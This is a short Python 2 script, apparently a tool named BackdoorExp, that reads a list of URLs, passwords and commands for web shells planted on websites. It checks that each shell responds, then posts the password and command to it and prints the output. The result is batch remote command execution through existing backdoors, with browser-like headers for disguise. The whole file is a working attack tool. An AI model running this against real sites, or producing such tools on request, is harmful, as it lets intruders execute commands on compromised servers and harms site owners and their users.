#coding:utf-8
import requests
from optparse import OptionParser


class BackdoorExp:
    def __init__(self,backdoor_file,timeout):
        self.file = backdoor_file
        self.backdoor_info = []
        self.timeout = timeout

        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    def __load_backdoor(self):
        with open(self.file,'rb+') as f:
            for info in f.readlines():
                if not info.startswith('#') and info.strip():
                    self.backdoor_info.append(info.strip())

    def __check_backdoor_available(self,url):
        try:
            result = requests.head(url,headers= self.headers,timeout= self.timeout)
            if result.status_code == 200:
                return True
        except:
            print '%s cannot access!' % url

    def exp(self):
        self.__load_backdoor()

        for item in self.backdoor_info:
            _ = item.split('|||')

            url = _[0]
            passwd = _[1] 
            cmd = _[2] if _[2].endswith(';') else _[2]+';'

            data = '%s=%s' % (passwd,cmd)

            if self.__check_backdoor_available(url):        
                result = requests.post(url,headers= self.headers,data=data,timeout=self.timeout).text
                print '*'*50
                print url
                print result.strip('one')


if __name__ == '__main__':
    usage = 'usage: backdoor_exp [options] arg'
    parser = OptionParser(usage)
    parser.add_option('-f', '--url_file', dest = 'url_file', default = 'backdoor.txt', help = 'the target file to pentest,defalut backdoor.txt')
    parser.add_option('--timeout', dest = 'timeout', default = 5, help = 'http timeout,default 5')

    (options, args) = parser.parse_args()

    file = options.url_file
    timeout = options.timeout
    
    t = BackdoorExp(file,timeout)
    t.exp()

